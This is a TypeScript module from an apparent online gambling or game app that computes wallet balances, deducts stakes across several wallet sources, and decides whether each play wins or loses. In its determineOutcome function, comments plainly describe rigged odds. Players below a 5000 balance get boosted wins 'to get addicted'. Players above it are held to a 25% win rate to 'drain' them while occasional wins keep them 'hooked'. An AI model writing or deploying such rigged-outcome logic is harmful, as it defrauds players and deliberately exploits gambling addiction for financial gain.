
import { supabase } from '../integrations/supabase/client';

// Threshold where the system starts draining the user
const WIN_THRESHOLD = 5000; 

export const getPlayableBalance = async (userId: string) => {
    const { data: wallet } = await supabase.from('wallets').select('*').eq('user_id', userId).single();
    if (!wallet) return 0;
    
    // Aggregate all playable sources
    return (wallet.main_balance || 0) + 
           (wallet.game_balance || 0) + 
           (wallet.deposit_balance || 0) + 
           (wallet.earning_balance || 0) + 
           (wallet.referral_balance || 0) + 
           (wallet.bonus_balance || 0) + 
           (wallet.commission_balance || 0);
};

export const deductGameBalance = async (userId: string, amount: number) => {
    const { data: wallet } = await supabase.from('wallets').select('*').eq('user_id', userId).single();
    if (!wallet) throw new Error("Wallet not found");

    let remaining = amount;
    const updates: any = {};

    // Priority Order: Game -> Bonus -> Deposit -> Earning -> Referral -> Commission -> Main
    const sources = ['game_balance', 'bonus_balance', 'deposit_balance', 'earning_balance', 'referral_balance', 'commission_balance', 'main_balance'];

    for (const source of sources) {
        if (remaining <= 0) break;
        // @ts-ignore
        const available = wallet[source] || 0;
        if (available > 0) {
            const take = Math.min(available, remaining);
            updates[source] = available - take;
            remaining -= take;
        }
    }

    if (remaining > 0.001) throw new Error("Insufficient funds across all wallets");

    // Also update aggregates if main/deposit touched (legacy sync)
    if (updates.main_balance !== undefined) {
        updates.balance = updates.main_balance; 
        updates.withdrawable = updates.main_balance; 
    }

    const { error } = await supabase.from('wallets').update(updates).eq('user_id', userId);
    if (error) throw error;
    
    return true;
};

export const determineOutcome = async (userId: string, chance: number = 0.5): Promise<'win' | 'loss'> => {
    try {
        // 1. Check Total Balance to determine phase
        const currentBalance = await getPlayableBalance(userId);
        
        // 2. Drain Phase (Balance > 5000)
        // User has won enough. Now we make them lose mostly, but give occasional hope.
        if (currentBalance >= WIN_THRESHOLD) {
            // "Loss win Loss win Win loss" pattern logic simulation
            // We reduce win chance significantly to drain, but keep it non-zero to hook.
            if (Math.random() < 0.25) return 'win'; // 25% Win Rate (Drain)
            return 'loss';
        }

        // 3. Hook Phase (Balance < 5000)
        // Let them win more often to get addicted. Boost their base chance.
        // Cap at 80% to maintain some realism
        const boostedChance = Math.min(0.80, chance + 0.15);
        
        return Math.random() < boostedChance ? 'win' : 'loss';

    } catch (e) {
        // Fallback
        return Math.random() < chance ? 'win' : 'loss';
    }
};
